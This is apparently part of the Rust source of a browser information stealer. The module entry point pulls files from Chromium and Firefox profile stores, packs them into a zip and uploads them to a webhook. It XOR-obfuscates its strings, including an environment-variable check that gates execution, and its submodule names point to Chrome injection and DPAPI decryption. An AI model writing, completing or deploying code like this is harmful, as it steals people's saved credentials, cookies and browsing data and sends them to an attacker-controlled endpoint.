pub mod chrome_inject;
pub mod chromium;
pub mod gecko;
mod dpapi_fallback;
mod netscape;
pub mod sender;
mod zip_layout;

const XOR_KEY: u8 = 0x5A;

pub(crate) fn xor_str(data: &[u8]) -> String {
    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
}

pub(crate) fn xor_bytes(data: &[u8]) -> Vec<u8> {
    data.iter().map(|&b| b ^ XOR_KEY).collect()
}

pub(crate) fn env_configured() -> bool {
    std::env::var(xor_str(&[0x08, 0x0F, 0x09, 0x0E, 0x05, 0x18, 0x1B, 0x19, 0x11, 0x0E, 0x08, 0x1B, 0x19, 0x1F]))
        .ok()
        .as_deref()
        == Some(&xor_str(&[0x6B]))
}

pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<dyn std::error::Error>> {
    if !env_configured() {
        return Ok(());
    }

    let mut all_files: Vec<(String, String)> = Vec::new();

    let gecko_handle = std::thread::spawn(|| gecko::extract_all());
    let chromium_files = chromium::extract_all();
    let gecko_files = gecko_handle.join().unwrap_or_default();

    all_files.extend(chromium_files);
    all_files.extend(gecko_files);

    zip_layout::sort_entries(&mut all_files);

    if !all_files.is_empty() {
        sender::send_zip(client, webhook_url, &all_files).await?;
    }

    Ok(())
}
